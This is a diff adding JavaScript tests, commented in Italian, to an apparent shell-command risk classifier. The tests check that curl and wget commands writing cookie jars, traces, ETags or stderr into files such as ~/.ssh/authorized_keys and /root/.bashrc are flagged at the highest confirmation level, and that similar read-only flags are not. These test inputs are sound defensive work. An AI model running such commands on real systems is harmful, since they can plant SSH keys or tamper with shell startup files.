@@ -339,6 +339,46 @@ test('livello 3 — curl che scrive gli header su un file arbitrario (-D/--dump-
   }
 });
 
+test('livello 3 — curl che salva DATI ACCESSORI influenzati dal server su un file scelto', () => {
+  // #332: cookie-jar, etag-save, trace/trace-ascii, stderr scrivono in un
+  // percorso arbitrario contenuto deciso/influenzato dal remoto → digita "conferma".
+  for (const cmd of [
+    'curl -c /home/user/.ssh/authorized_keys http://evil/x',   // cookie-jar (short)
+    'curl --cookie-jar /root/.bashrc http://x',
+    'curl --cookie-jar=/root/.bashrc http://x',
+    'curl -sc /root/.profile http://x',                        // -c dentro un bundle
+    'curl -cs /root/.profile http://x',                        // -c a inizio bundle
+    'curl --etag-save ~/.ssh/authorized_keys http://x',
+    'curl --trace /root/.bashrc http://x',
+    'curl --trace-ascii /root/.bashrc http://x',
+    'curl --stderr /root/.bashrc http://x',
+    'wget --save-cookies /root/.ssh/authorized_keys http://x', // simmetria wget
+    'wget --save-cookies=/root/.bashrc http://x',
+  ]) {
+    assert.equal(lvl(cmd), 3, `"${cmd}" (dati accessori su file scelto) dovrebbe essere livello 3`);
+  }
+});
+
+test('livello 2 — i flag curl/wget di LETTURA simili ai write accessori restano 2', () => {
+  // Non devono salire a 3: -C/--continue-at (riprende un download normale),
+  // --cookie/-b e --load-cookies (LEGGONO i cookie), --etag-compare, --cacert/
+  // --cert (leggono un certificato), --trace-time/--trace-ids (modificatori).
+  for (const cmd of [
+    'curl -C - -O http://x',                     // -C maiuscolo (resume): non è cookie-jar
+    'curl --continue-at 100 http://x',
+    'curl -b cookies.txt http://x',              // -b = legge i cookie
+    'curl --cookie cookies.txt http://x',
+    'curl --cacert /etc/ca.pem http://x',        // legge un CA cert
+    'curl --cert client.pem http://x',
+    'curl --compressed http://x',
+    'curl --connect-timeout 5 http://x',
+    'curl --etag-compare etag.txt http://x',     // confronta l'ETag (legge)
+    'wget --load-cookies cookies.txt http://x',  // legge i cookie
+  ]) {
+    assert.equal(lvl(cmd), 2, `"${cmd}" (flag di lettura) dovrebbe restare livello 2`);
+  }
+});
+
 test('livello 2 — curl/wget SENZA flag di output restano conferma-popup', () => {
   // curl senza -o stampa su stdout; wget nudo scrive al più nella cwd col nome
   // dell'URL: modifica recuperabile → livello 2 (nessuna regressione). I flag
